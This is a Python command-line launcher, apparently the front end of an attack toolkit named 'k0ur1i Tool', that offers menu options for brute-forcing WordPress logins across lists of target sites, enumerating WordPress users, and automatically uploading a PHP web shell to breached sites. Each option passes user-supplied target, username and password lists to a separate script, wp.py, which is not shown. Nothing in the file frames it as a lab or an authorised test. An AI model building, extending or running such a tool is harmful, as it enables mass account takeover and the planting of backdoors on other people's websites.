import os
import time
import subprocess
import sys
from art import *
from datetime import datetime


def display_header():
    """
    Display the animated ASCII art header with the custom logo.
    """
    # Generate ASCII art for my name and the tool branding
    logo_art = text2art("k0ur1i Tool", "block")  # Logo with my name and "Tool"
    subtitle_art = text2art("WordPress Brute Force", "standard")  # Subtitle in a smaller font

    # Display the logo and subtitle with animated effect
    print(logo_art)
    print(subtitle_art)
    print("-" * 60)
    print("[INFO] Current Date and Time: ", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("-" * 60)


def display_menu():
    """
    Display the main menu and get user choice.
    """
    menu = """
    ╔════════════════════════════════════════╗
    ║              MAIN MENU                 ║
    ╠════════════════════════════════════════╣
    ║ [1] Brute Force Attack                ║
    ║ [2] User Enumeration                  ║
    ║ [3] Auto Upload PHP Shell             ║
    ║ [4] Exit                              ║
    ╚════════════════════════════════════════╝
    """
    print(menu)
    choice = input("Choose an option: ")
    return choice


def run_attack(choice):
    """
    Run the selected attack based on user input.
    """
    if choice == "1":
        print("[INFO] Running Brute Force Attack...")
        target_file = input("Enter the path to your targets.txt: ")
        userlist_file = input("Enter the path to your userlist.txt: ")
        passlist_file = input("Enter the path to your passlist.txt: ")
        threads = input("Enter the number of threads (default 10): ")
        timeout = input("Enter the timeout (default 10): ")

        command = [
            "python3", "wp.py",
            "-T", target_file,
            "-U", userlist_file,
            "-P", passlist_file,
            "-t", threads if threads else "10",
            "--timeout", timeout if timeout else "10"
        ]
        print(f"[INFO] Executing command: {' '.join(command)}")
        subprocess.run(command)

    elif choice == "2":
        print("[INFO] Running User Enumeration...")
        target_file = input("Enter the path to your targets.txt: ")
        userlist_file = input("Enter the path to your userlist.txt: ")

        command = [
            "python3", "wp.py",
            "-T", target_file,
            "-U", userlist_file,
            "--enumerate"
        ]
        print(f"[INFO] Executing command: {' '.join(command)}")
        subprocess.run(command)

    elif choice == "3":
        print("[INFO] Running Auto Upload Shell...")
        target_file = input("Enter the path to your targets.txt: ")
        userlist_file = input("Enter the path to your userlist.txt: ")
        passlist_file = input("Enter the path to your passlist.txt: ")
        shell_file = input("Enter the path to your PHP shell: ")
        threads = input("Enter the number of threads (default 10): ")
        timeout = input("Enter the timeout (default 10): ")

        command = [
            "python3", "wp.py",
            "-T", target_file,
            "-U", userlist_file,
            "-P", passlist_file,
            "-t", threads if threads else "10",
            "--timeout", timeout if timeout else "10",
            "--upload-shell", shell_file
        ]
        print(f"[INFO] Executing command: {' '.join(command)}")
        subprocess.run(command)

    elif choice == "4":
        print("[INFO] Exiting...")
        sys.exit(0)

    else:
        print("[ERROR] Invalid choice. Please try again.")
        time.sleep(2)


def main():
    """
    Main function to display the CLI panel and handle the flow.
    """
    while True:
        os.system("cls" if os.name == "nt" else "clear")  # Clear screen for Windows or Linux
        display_header()
        choice = display_menu()
        run_attack(choice)
        time.sleep(2)  # Pause before the next menu display


if __name__ == "__main__":
    main()
